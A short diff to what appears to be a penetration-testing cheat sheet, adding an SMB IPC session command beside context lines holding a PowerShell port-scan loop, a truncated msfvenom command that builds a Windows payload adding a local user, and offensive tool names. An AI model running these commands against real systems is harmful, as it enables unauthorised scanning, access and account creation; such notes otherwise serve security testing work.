@@ -39,6 +39,7 @@ $Target = "172.16.6.50"; 1..1024 | ForEach-Object { try { $c = New-Object System
   ```
 ## smb
   ```
+  net use \\target\$IPC /user:test
   net view \\target /all
   ```
 ## view errors redirecting STDERR to STDOUT
@@ -296,6 +297,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
 
